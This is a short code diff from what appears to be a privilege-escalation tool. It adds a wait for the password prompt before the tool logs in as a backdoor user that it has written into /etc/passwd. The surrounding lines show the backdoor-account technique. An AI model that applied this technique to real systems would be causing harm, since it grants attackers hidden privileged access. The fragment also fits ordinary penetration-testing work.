@@ -117,6 +117,7 @@ class Finder:
                 raise PrivescError("/etc/passwd update failed!")
 
         self.pty.process(f"su {self.backdoor_user_name}", delim=False)
+        self.pty.recvuntil(": ")
         self.pty.flush_output()
 
         self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
